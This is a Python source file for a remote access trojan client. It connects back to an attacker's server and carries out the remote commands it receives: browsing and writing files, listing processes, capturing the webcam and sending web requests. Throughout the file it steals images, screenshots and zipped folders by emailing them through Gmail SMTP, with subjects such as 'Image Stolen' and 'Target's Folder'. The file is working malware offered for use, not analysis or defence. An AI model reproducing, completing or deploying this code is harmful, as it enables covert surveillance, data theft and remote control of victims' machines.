import os
import socket
from cv2 import VideoCapture, imwrite
import requests
import smtplib
import wmi
import shutil
import pyscreenshot as imagegrabber
from bs4 import BeautifulSoup
from cv2 import *
from email.mime.multipart import MIMEMultipart
from email.mime.image import MIMEImage
from email.mime.application import MIMEApplication

SERVER = 'smtp.gmail.com'
PORT = 587
FROM = ''   # Your gmail account from you want a mail
TO = ''     # Your gmail account on which you want to get that mail
PASS = ''   # Password of your FROM gmail account

# Connecting
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = ""   # Use your private IP if the server's in LAN, otherwise use your public IP.
    port = 8080
    sock.connect((host, port))
    print("")
    print("Connected to the server successfully")
except Exception as e:
    print(e)

# Accepting the commands that are maked in the server's scirpt we are connected to
while True:
    command = sock.recv(1024)
    command = command.decode()
    print("Command Recieved")

    if command == "cwd":
        files = os.getcwd()
        files = str(files)
        sock.send(files.encode())

    elif command == "exit":
        print("Connection Aborted")
        break

    elif command == "dir" or command == "ls":
        files = os.listdir()
        files = str(files)
        sock.send(files.encode())

    elif 'cd' in command and command != "cd .." and command != "cd ../..":
        try:
            os.chdir(command.split("*")[1])
            sock.send(os.getcwd().encode())
        except Exception as e:
            files = str(e)
            sock.send(files.encode())

    elif 'readlines' in command:
        with open(command.split("*")[1], "r") as f:
            files = f.readlines()
        files = str(files)
        sock.send(files.encode())

    elif 'nul > ' in command:
        with open(command.split("*")[1], "w") as f:
            f.write(command.split("*")[2])
        files = "File Created"
        sock.send(files.encode())

    elif "image" in command:
        try:
            path = command.split("*")[1]
            name = command.split("*")[2]
            with open(path, "rb") as f:
                img_data = f.read()
            msg = MIMEMultipart()
            msg['Subject'] = "Image Stolen"
            msg['From'] = FROM
            msg['To'] = TO
            image = MIMEImage(img_data, name=os.path.basename(name))
            msg.attach(image)
            server = smtplib.SMTP(SERVER, PORT)
            server.set_debuglevel(1)
            server.ehlo()
            server.starttls()
            server.login(FROM, PASS)
            server.sendmail(FROM, TO, msg.as_string())
            server.quit()
            files = "Email Sent Successfully"
            sock.send(files.encode())
        except Exception as e:
            files = e
            files = str(files)
            sock.send(files.encode())

    elif "folder" in command.split("*")[0]:
        try:
            fullpath = command.split("*")[2]
            path = command.split("*")[1]
            os.chdir(path)
            shutil.make_archive("Stolen", "zip", fullpath)
            os.chmod(path, 0o444)
            msg = MIMEMultipart()
            msg['Subject'] = "Target's Folder"
            msg['From'] = FROM
            msg['To'] = TO
            with open(f"{path}/Stolen.zip", "rb") as f:
                msg.attach(MIMEApplication(f.read(), Name="Stolen.zip"))
            server = smtplib.SMTP(SERVER, PORT)
            server.set_debuglevel(1)
            server.ehlo()
            server.starttls()
            server.login(FROM, PASS)
            server.sendmail(FROM, TO, msg.as_string())
            server.quit()
            files = "Email Send Successfully"
            sock.send(files.encode())
        except Exception as e:
            files = str(e)
            sock.send(files.encode())

    elif command == "cd ..":
        try:   
            current = os.getcwd().split("\\")
            current.pop()
            path = '/'.join([str(item) for item in current])
            os.chdir(path)
            files = os.getcwd()
            sock.send(files.encode())
        except Exception as e:
            files = str(e)
            sock.send(files.encode())

    elif command == "cd ../..":
        try:
            current = os.getcwd().split("\\")
            current.pop()
            current.pop()
            path = '/'.join([str(item) for item in current])
            os.chdir(path)
            files = os.getcwd()
            sock.send(files.encode())
        except Exception as e:
            files = str(e)
            sock.send(files.encode())

    elif "mkdir" in command:
        os.mkdir(command.split(" ")[1])
        files = "Directory Created"
        sock.send(files.encode())

    elif "get request" in command:
        url = command.split("*")[1]
        r = command.split("*")[2]
        try:
            response = requests.get(url)
            if r == '1' or r == 'content':
                content = response.content
                soup = BeautifulSoup(content, 'html.parser')
                files = str(soup)
                sock.send(files.encode())
            elif r == '2' or r == 'status':
                status = response.status_code
                files = str(status)
                sock.send(files.encode())
        except Exception as e:
            files = str(e)
            sock.send(files.encode())

    elif "post request" in command:
        url = command.split("*")[1]
        data = command.split("*")[2]
        try:
            response = requests.post(url, data)
            files = str(response)
            sock.send(files.encode())
        except Exception as e:
            files = str(e)
            sock.send(files.encode())

    elif "drive" in command:
        name = command.split(" ")[1]
        try:
            os.chdir(f"{name}:/")
            files = str(os.getcwd())
            sock.send(files.encode())
        except Exception as e:
            files = str(e)
            sock.send(files.encode())

    elif command == "tasklist":
        f = wmi.WMI()
        files = []
        for process in f.Win32_Process():
                files.append(f"{process.ProcessId:<10} {process.Name}\n")
        files = str(files)
        sock.send(files.encode())
        
    elif "screenshot" in command:
        path = os.getcwd()
        name = command.split(" ")[1]
        imagee = imagegrabber.grab()
        imagee.save(f"{path}\\{name}")
        with open(f"{path}\\{name}", "rb") as f:
            img_data = f.read()
        msg = MIMEMultipart()
        msg['Subject'] = "Image Captured"
        msg['From'] = FROM 
        msg['To'] = TO
        image = MIMEImage(img_data, name=os.path.basename(name))
        msg.attach(image)
        server = smtplib.SMTP(SERVER, PORT)
        server.set_debuglevel(1)
        server.ehlo()
        server.starttls()
        server.login(FROM, PASS)
        server.sendmail(FROM, TO, msg.as_string())
        server.quit()
        files = "Email Sent Successfully"
        sock.send(files.encode())

    elif "webcam" in command:
        name = command.split(" ")[1]
        cam = VideoCapture(0)
        result, image = cam.read()
        try:
            imwrite(name, image)
            files = "Image Captured!"
            sock.send(files.encode())
        except:
            files = ("No image detected. Please Try Again")
            sock.send(files.encode())
    
    elif "print" in command:
        content = command.split("*")[1]
        files = content
        files = str(files)
        sock.send(files.encode())
